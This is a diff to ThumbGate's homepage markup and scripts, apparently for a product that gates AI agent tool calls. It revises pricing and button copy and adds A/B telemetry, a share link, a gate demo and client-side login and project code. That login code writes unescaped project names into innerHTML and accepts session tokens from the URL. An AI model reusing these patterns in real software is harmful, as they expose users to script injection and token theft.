+            <p style="margin-top:12px;"><a href="/whitepaper">White paper</a> · <a href="/eval-scorecard">Scorecard</a> · <a href="/architecture">Architecture</a> · <a href="/case-studies">Dogfood, not customer stories</a></p>
           </div>
+        </div>
+        <table class="compare">
+          <caption>Static hooks, sandboxes, and ThumbGate</caption>
+          <thead>
+            <tr><th></th><th>Static hook</th><th>Sandbox</th><th>ThumbGate</th></tr>
+          </thead>
+          <tbody>
+            <tr><th>When it acts</th><td>Listed commands</td><td>After start</td><td>Before the tool call</td></tr>
+            <tr><th>Learns from thumbs</th><td>No</td><td>No</td><td>Yes, locally</td></tr>
+            <tr><th>Contains the blast</th><td>No</td><td>Yes</td><td>No</td></tr>
+          </tbody>
+        </table>
       </div>
     </section>
 
@@ -945,7 +1094,7 @@ next      decision recorded before execution</pre>
           </div>
           <div class="faq-item">
             <button class="faq-q" type="button" aria-expanded="false">Is this the enterprise option?</button>
-            <div class="faq-a">Yes. The $499 Enterprise Workflow Gate is the enterprise entry offer for one supported workflow. It is not an org-wide hosted platform license: shared hosting, SSO, compliance packaging, and multi-workflow rollout require separate scope and are not generally available.</div>
+            <div class="faq-a">No. The $499 Setup Sprint configures one supported workflow with you. Shared hosting, SSO, compliance packaging, an org-wide audit log, and multi-workflow rollout are not included and are not generally available.</div>
           </div>
           <div class="faq-item">
             <button class="faq-q" type="button" aria-expanded="false">Does self-improving mean ThumbGate retrains my model?</button>
@@ -965,8 +1114,8 @@ next      decision recorded before execution</pre>
         <h2 class="section-title">Block the mistake your agent made last week.</h2>
         <p class="section-lede">Run <code>npx thumbgate init</code> (MIT), upgrade to <strong style="color:var(--text)">Pro ($19/mo)</strong> for unlimited gates, or book a <strong style="color:var(--text)">$499 setup</strong>.</p>
         <div style="display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin-top:22px">
-          <a class="nav-buy" href="/checkout/pro?utm_source=website&amp;utm_medium=homepage_final&amp;utm_campaign=pro_self_serve&amp;cta_id=final_pro_buy&amp;cta_placement=final&amp;plan_id=pro" data-offer-link data-cta-id="final_pro_buy">Start Pro — $19/mo</a>
-          <a class="nav-enterprise" href="#enterprise-gate" data-offer-link data-cta-id="final_diagnostic_buy">Buy the $499 enterprise gate</a>
+          <a class="nav-buy" href="#install" data-cta-id="final_install_free">Install free</a>
+          <a class="nav-enterprise" href="#enterprise-gate" data-offer-link data-cta-id="final_diagnostic_buy">See the $499 setup</a>
         </div>
       </div>
     </section>
@@ -1036,16 +1185,52 @@ next      decision recorded before execution</pre>
       }
     }
 
+    const urlParams = (function () {
+      try { return new URLSearchParams(window.location.search); } catch (_) { return new URLSearchParams(); }
+    })();
+    const activeAbVariant = (function () {
+      try {
+        const fromUrl = urlParams.get('campaign_variant') || urlParams.get('variant');
+        if (fromUrl) {
+          localStorage.setItem('tg_ab_variant', fromUrl);
+          return fromUrl;
+        }
+        const saved = localStorage.getItem('tg_ab_variant');
+        if (saved) return saved;
+        const seed = String(serverVisitorId || Date.now());
+        let hash = 0;
+        for (let i = 0; i < seed.length; i++) hash = ((hash << 5) - hash + seed.charCodeAt(i)) | 0;
+        const assigned = Math.abs(hash) % 2 === 0 ? 'variant_a_mistake_firewall' : 'variant_b_token_burn_42pct';
+        localStorage.setItem('tg_ab_variant', assigned);
+        return assigned;
+      } catch (_) {
+        return 'variant_a_mistake_firewall';
+      }
+    })();
+    window.tgAbVariant = activeAbVariant;
+
     function sendFirstPartyTelemetry(eventName, props) {
       if (privacySignalOptOut()) return;
+      const mergedProps = Object.assign({
+        campaignVariant: activeAbVariant,
+        utmSource: urlParams.get('utm_source') || undefined,
+        utmMedium: urlParams.get('utm_medium') || undefined,
+        utmCampaign: urlParams.get('utm_campaign') || undefined,
+        referredByVisitorId: urlParams.get('ref') || urlParams.get('referred_by') || undefined,
+      }, props || {});
       const payload = JSON.stringify({
         event: eventName,
         page: '/',
-        source: 'homepage',
+        source: urlParams.get('utm_source') || 'homepage',
+        utmSource: urlParams.get('utm_source') || undefined,
+        utmMedium: urlParams.get('utm_medium') || undefined,
+        utmCampaign: urlParams.get('utm_campaign') || undefined,
+        campaignVariant: activeAbVariant,
+        referredByVisitorId: urlParams.get('ref') || urlParams.get('referred_by') || undefined,
         visitorId: serverVisitorId || undefined,
         sessionId: serverSessionId || undefined,
         acquisitionId: serverAcquisitionId || undefined,
-        props: props || {},
+        props: mergedProps,
       });
       try {
         if (navigator.sendBeacon) {
@@ -1060,6 +1245,25 @@ next      decision recorded before execution</pre>
         }).catch(function () {});
       } catch (_) {}
     }
+
+    window.tgShareViralLink = function (channel) {
+      const targetChannel = String(channel || 'linkedin').toLowerCase();
+      const refId = encodeURIComponent(serverVisitorId || 'founder');
+      const shareUrl = 'https://thumbgate.ai/go/bundle-49?ref=' + refId +
+        '&utm_source=' + encodeURIComponent(targetChannel) +
+        '&utm_medium=viral_share&utm_campaign=nov2026_viral&campaign_variant=' + encodeURIComponent(activeAbVariant);
+      sendFirstPartyTelemetry('viral_share', {
+        shareChannel: targetChannel,
+        campaignVariant: activeAbVariant,
+        shareUrl: shareUrl,
+      });
+      if (targetChannel === 'linkedin') {
+        window.open('https://www.linkedin.com/sharing/share-offsite/?url=' + encodeURIComponent(shareUrl), '_blank', 'noopener');
+      } else if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(shareUrl).catch(function () {});
+      }
+      return shareUrl;
+    };
 
     function sendGa4Event(eventName, params) {
       if (privacySignalOptOut()) return;
@@ -1097,7 +1301,7 @@ next      decision recorded before execution</pre>
         if (privacySignalOptOut()) return;
         const props = {
           ctaId: 'homepage_diagnostic_buy',
-          ctaPlacement: 'hero',
+          ctaPlacement: 'offers',
           planId: 'sprint_diagnostic',
           value: 499,
           currency: 'USD',
@@ -1344,6 +1548,36 @@ next      decision recorded before execution</pre>
       } catch (_) {}
     })();
 
+    (function initHeroGateDemo() {
+      const demo = document.getElementById('hero-gate-demo');
+      const note = document.getElementById('hero-gate-note');
+      const down = document.getElementById('hero-thumb-down');
+      if (!demo || !note || !down) return;
+      const rows = demo.querySelectorAll('.hero-gate-row');
+      let selected = 'secret';
+      const notes = {
+        secret: 'Already denied on every install. A thumbs-down does not change a secret floor.',
+        force: 'One thumbs-down stores a local lesson. This stays a warning. Deny needs strict mode, or three repeated negatives.',
+        rm: 'One thumbs-down stores a local lesson and promotes a warning. Deny needs three repeated negatives, and strict mode, not this click.',
+      };
+      rows.forEach(function (row) {
+        row.addEventListener('click', function () {
+          selected = row.getAttribute('data-gate') || 'secret';
+          rows.forEach(function (other) {
+            const on = other === row;
+            other.classList.toggle('is-selected', on);
+            other.setAttribute('aria-selected', on ? 'true' : 'false');
+          });
+          note.textContent = '';
+        });
+      });
+      down.addEventListener('click', function () {
+        note.textContent = notes[selected] || notes.secret;
+        down.classList.add('is-lit');
+        window.setTimeout(function () { down.classList.remove('is-lit'); }, 700);
+      });
+    })();
+
     if (!serverTelemetryCaptured) {
       sendFirstPartyTelemetry('page_view', { landingPath: '/' });
     }
@@ -1375,6 +1609,293 @@ next      decision recorded before execution</pre>
         } else { fallback(); }
       });
     });
+  })();
+</script>
+<script>
+  (function () {
+    var homeBar = document.getElementById('homeSsoBar');
+    var homeLoginRow = document.getElementById('homeSsoLoginRow');
+    var homeProjectsRow = document.getElementById('homeProjectsRow');
+    var homeSignUpBtn = document.getElementById('homeSsoSignUpBtn');
+    var homeSignInBtn = document.getElementById('homeSsoSignInBtn');
+    var homeLogoutBtn = document.getElementById('homeSsoLogoutBtn');
+    var homeBadge = document.getElementById('homeSsoBadge');
+    var homeEmailInput = document.getElementById('homeSsoEmail');
+    var homePasswordInput = document.getElementById('homeSsoPassword');
+    var homeSubmitBtn = document.getElementById('homeSsoSubmitBtn');
+    var homeModeToggleBtn = document.getElementById('homeSsoModeToggleBtn');
+    var homeProjectSelect = document.getElementById('homeProjectSelect');
+    var homeOpenLink = document.getElementById('homeOpenProjectLink');
+    var currentHomeAuthMode = 'login';
+
+    try {
+      if (localStorage.getItem('tg_auth_schema_version') !== 'v2_verified_accounts') {
+        localStorage.removeItem('tg_cloud_sso_token');
+        localStorage.removeItem('tg_cloud_sso_email');
+        localStorage.removeItem('tg_cloud_sso_provider');
+        localStorage.removeItem('tg_enterprise_sso_token');
+        localStorage.removeItem('tg_enterprise_sso_email');
+        localStorage.removeItem('tg_enterprise_sso_provider');
+        localStorage.setItem('tg_auth_schema_version', 'v2_verified_accounts');
+      }
+    } catch (e) {}
+
+    window.tgSetHomeAuthMode = function (mode, openBar) {
+      currentHomeAuthMode = mode === 'signup' ? 'signup' : 'login';
+      var promptEl = document.getElementById('homeSsoPrompt');
+      if (currentHomeAuthMode === 'signup') {
+        if (promptEl) {
+          promptEl.style.color = 'var(--green)';
+          promptEl.textContent = '✨ Create Your Account (enter email + password ≥ 6 chars):';
+        }
+        if (homePasswordInput) homePasswordInput.placeholder = 'Create password (min 6 chars)';
+        if (homeSubmitBtn) {
+          homeSubmitBtn.textContent = '✨ Create Account';
+          homeSubmitBtn.style.background = 'var(--green)';
+        }
+        if (homeModeToggleBtn) homeModeToggleBtn.textContent = 'Have an account? Log In';
+      } else {
+        if (promptEl) {
+          promptEl.style.color = 'var(--text)';
+          promptEl.textContent = '🔐 Log In to your account (or click Sign Up):';
+        }
+        if (homePasswordInput) homePasswordInput.placeholder = 'Password or tg_live_... key';
+        if (homeSubmitBtn) {
+          homeSubmitBtn.textContent = 'Log In';
+          homeSubmitBtn.style.background = 'var(--cyan)';
+        }
+        if (homeModeToggleBtn) homeModeToggleBtn.textContent = 'Need an account? Sign Up';
+      }
+      if (openBar) window.tgToggleHomeSso(true);
+    };
+
+    window.tgToggleAuthMode = function () {
+      window.tgSetHomeAuthMode(currentHomeAuthMode === 'login' ? 'signup' : 'login', true);
+    };
+
+    window.tgToggleHomeSso = function (forceOpen) {
+      if (!homeBar) return;
+      var isHidden = homeBar.style.display === 'none' || !homeBar.style.display;
+      var nextOpen = typeof forceOpen === 'boolean' ? forceOpen : isHidden;
+      homeBar.style.display = nextOpen ? 'block' : 'none';
+      if (nextOpen && homeEmailInput && homeLoginRow && homeLoginRow.style.display !== 'none') {
+        homeEmailInput.focus();
+      }
+    };
+
+    window.tgSwitchHomeProject = function (slug) {
+      var clean = String(slug || 'default').trim() || 'default';
+      try { localStorage.setItem('tg_active_project', clean); } catch (e) {}
+      if (homeOpenLink) homeOpenLink.href = '/dashboard?project=' + encodeURIComponent(clean);
+    };
+
+    async function tgHydrateHomeProjects() {
+      var token = '';
+      var email = '';
+      var provider = '';
+      try {
+        var params = new URLSearchParams(window.location.search);
+        if (params.get('sso_token')) {
+          localStorage.setItem('tg_cloud_sso_token', params.get('sso_token'));
+          localStorage.setItem('tg_enterprise_sso_token', params.get('sso_token'));
+          localStorage.setItem('tg_auth_schema_version', 'v2_verified_accounts');
+          if (params.get('email')) localStorage.setItem('tg_cloud_sso_email', params.get('email'));
+          if (params.get('sso_provider')) localStorage.setItem('tg_cloud_sso_provider', params.get('sso_provider'));
+        }
+        token = localStorage.getItem('tg_cloud_sso_token') || localStorage.getItem('tg_enterprise_sso_token') || '';
+        email = localStorage.getItem('tg_cloud_sso_email') || localStorage.getItem('tg_enterprise_sso_email') || '';
+        provider = localStorage.getItem('tg_cloud_sso_provider') || localStorage.getItem('tg_enterprise_sso_provider') || 'account';
+      } catch (e) {}
+      if (!token) {
+        if (homeBar) homeBar.style.display = 'none';
+        if (homeSignUpBtn) homeSignUpBtn.style.display = 'inline-flex';
+        if (homeSignInBtn) homeSignInBtn.style.display = 'inline-flex';
+        if (homeLogoutBtn) homeLogoutBtn.style.display = 'none';
+        if (homeBadge) homeBadge.style.display = 'none';
+        if (homeLoginRow) homeLoginRow.style.display = 'flex';
+        if (homeProjectsRow) homeProjectsRow.style.display = 'none';
+        return;
+      }
+      try {
+        var res = await fetch('/v1/projects', { headers: { 'Authorization': 'Bearer ' + token } });
+        if (!res.ok) throw new Error('expired');
+        var data = await res.json();
+        var resolvedEmail = data.email || email || 'authenticated';
+        var resolvedProvider = String(data.provider || provider || 'account').toUpperCase();
+        if (homeBar) homeBar.style.display = 'block';
+        if (homeLoginRow) homeLoginRow.style.display = 'none';
+        if (homeProjectsRow) homeProjectsRow.style.display = 'flex';
+        if (homeSignUpBtn) homeSignUpBtn.style.display = 'none';
+        if (homeSignInBtn) homeSignInBtn.style.display = 'none';
+        if (homeLogoutBtn) homeLogoutBtn.style.display = 'inline-flex';
+        if (homeBadge) {
+          homeBadge.textContent = '🟢 ' + resolvedEmail;
+          homeBadge.style.display = 'inline-flex';
+        }
+        var sessionTxt = document.getElementById('homeSsoSessionText');
+        if (sessionTxt) sessionTxt.textContent = '🟢 ' + resolvedProvider + ' ACCOUNT · ' + resolvedEmail;
+        var projects = Array.isArray(data.projects) ? data.projects : [];
+        var savedProj = '';
+        try { savedProj = localStorage.getItem('tg_active_project') || ''; } catch (e) {}
+        var activeSlug = savedProj || data.activeProjectSlug || (projects[0] && projects[0].slug) || 'default';
+        if (homeProjectSelect) {
+          homeProjectSelect.innerHTML = projects.map(function (p) {
+            var sel = p.slug === activeSlug ? ' selected' : '';
+            var sigs = typeof p.totalFeedback === 'number' ? ' (' + p.totalFeedback + ' signals)' : '';
+            return '<option value="' + p.slug + '"' + sel + '>' + (p.name || p.slug) + sigs + '</option>';
+          }).join('');
+        }
+        window.tgSwitchHomeProject(activeSlug);
+      } catch (e) {
+        try {
+          localStorage.removeItem('tg_cloud_sso_token');
+          localStorage.removeItem('tg_enterprise_sso_token');
+        } catch (_) {}
+        if (homeBar) homeBar.style.display = 'none';
+        if (homeSignUpBtn) homeSignUpBtn.style.display = 'inline-flex';
+        if (homeSignInBtn) homeSignInBtn.style.display = 'inline-flex';
+        if (homeLogoutBtn) homeLogoutBtn.style.display = 'none';
+        if (homeBadge) homeBadge.style.display = 'none';
+        if (homeLoginRow) homeLoginRow.style.display = 'flex';
+        if (homeProjectsRow) homeProjectsRow.style.display = 'none';
+      }
+    }
+
+    window.tgSubmitHomeAuth = async function () {
+      var email = (homeEmailInput && homeEmailInput.value.trim()) || '';
+      var secret = (homePasswordInput && homePasswordInput.value.trim()) || '';
+      var promptEl = document.getElementById('homeSsoPrompt');
+      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        if (homeEmailInput) homeEmailInput.focus();
+        if (promptEl) {
+          promptEl.style.color = '#ff6b6b';
+          promptEl.textContent = 'Enter a valid email address first.';
+        }
+        return;
+      }
+      if (!secret) {
+        if (homePasswordInput) homePasswordInput.focus();
+        if (promptEl) {
+          promptEl.style.color = '#ff6b6b';
+          promptEl.textContent = currentHomeAuthMode === 'signup'
+            ? 'Enter a password (min 6 characters) to create your account.'
+            : 'Enter your account password or tg_live_... API key to log in.';
+        }
+        return;
+      }
+      var endpoint = currentHomeAuthMode === 'signup' ? '/v1/cloud/auth/signup' : '/v1/cloud/auth/login';
+      try {
+        var res = await fetch(endpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email: email, password: secret, apiKey: secret }),
+        });
+        var data = await res.json();
+        if (!res.ok || !data.ok) {
+          if (promptEl) {
+            promptEl.style.color = '#ff6b6b';
+            promptEl.textContent = data.message || 'Authentication failed.';
+          }
+          if (data && data.error === 'account_not_found') {
+            currentHomeAuthMode = 'signup';
+            if (homeSubmitBtn) {
+              homeSubmitBtn.textContent = '✨ Create Account';
+              homeSubmitBtn.style.background = 'var(--green)';
+            }
+          }
+          return;
+        }
+        try {
+          localStorage.setItem('tg_auth_schema_version', 'v2_verified_accounts');
+          localStorage.setItem('tg_cloud_sso_token', data.ssoToken);
+          localStorage.setItem('tg_cloud_sso_email', data.email);
+          localStorage.setItem('tg_cloud_sso_provider', data.provider || 'password');
+          localStorage.setItem('tg_enterprise_sso_token', data.ssoToken);
+          localStorage.setItem('tg_enterprise_sso_email', data.email);
+          localStorage.setItem('tg_enterprise_sso_provider', data.provider || 'password');
+        } catch (e) {}
+        if (homePasswordInput) homePasswordInput.value = '';
+        await tgHydrateHomeProjects();
+      } catch (err) {
+        if (promptEl) {
+          promptEl.style.color = '#ff6b6b';
+          promptEl.textContent = 'Network error: ' + err.message;
+        }
+      }
+    };
+
+    window.tgHomeSsoLogin = async function (provider) {
+      var email = (homeEmailInput && homeEmailInput.value.trim()) || '';
+      var promptEl = document.getElementById('homeSsoPrompt');
+      var res = await fetch('/v1/cloud/sso/authorize?provider=' + encodeURIComponent(provider) + '&email=' + encodeURIComponent(email) + '&require_oauth=1&redirect_uri=/&format=json', {
+        headers: { 'Accept': 'application/json' }
+      });
+      var data = await res.json();
+      if (data && data.mode === 'oauth_redirect' && data.redirectUrl) {
+        window.location.href = data.redirectUrl;
+        return;
+      }
+      if (!res.ok || !data.ok) {
+        if (promptEl) {
+          promptEl.style.color = '#ff6b6b';
+          promptEl.textContent = data.message || (String(provider).toUpperCase() + ' OAuth requires email + password Sign Up / Log In.');
+        }
+        if (homePasswordInput) homePasswordInput.focus();
+        return;
+      }
+      if (data && data.ok && data.ssoToken) {
+        try {
+          localStorage.setItem('tg_auth_schema_version', 'v2_verified_accounts');
+          localStorage.setItem('tg_cloud_sso_token', data.ssoToken);
+          localStorage.setItem('tg_cloud_sso_email', data.email);
+          localStorage.setItem('tg_cloud_sso_provider', data.provider);
+        } catch (e) {}
+        await tgHydrateHomeProjects();
+      }
+    };
+
+    window.tgCreateHomeProject = async function () {
+      var inp = document.getElementById('homeNewProjectInput');
+      var name = (inp && inp.value.trim()) || '';
+      var token = '';
+      try { token = localStorage.getItem('tg_cloud_sso_token') || localStorage.getItem('tg_enterprise_sso_token') || ''; } catch (e) {}
+      if (!name || !token) return;
+      var res = await fetch('/v1/projects', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
+        body: JSON.stringify({ name: name })
+      });
+      var data = await res.json();
+      if (data && data.ok && data.project) {
+        inp.value = '';
+        try { localStorage.setItem('tg_active_project', data.project.slug); } catch (e) {}
+        await tgHydrateHomeProjects();
+      }
+    };
+
+    window.tgHomeLogout = async function () {
+      var token = '';
+      try {
+        token = localStorage.getItem('tg_cloud_sso_token') || localStorage.getItem('tg_enterprise_sso_token') || '';
+        localStorage.removeItem('tg_cloud_sso_token');
+        localStorage.removeItem('tg_cloud_sso_email');
+        localStorage.removeItem('tg_cloud_sso_provider');
+        localStorage.removeItem('tg_enterprise_sso_token');
+        localStorage.removeItem('tg_enterprise_sso_email');
+        localStorage.removeItem('tg_enterprise_sso_provider');
+      } catch (e) {}
+      if (token) {
+        fetch('/v1/cloud/sso/logout', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ token: token })
+        }).catch(function () {});
+      }
+      await tgHydrateHomeProjects();
+    };
+
+    window.tgSetHomeAuthMode('login', false);
+    tgHydrateHomeProjects();
   })();
 </script>
 </body>
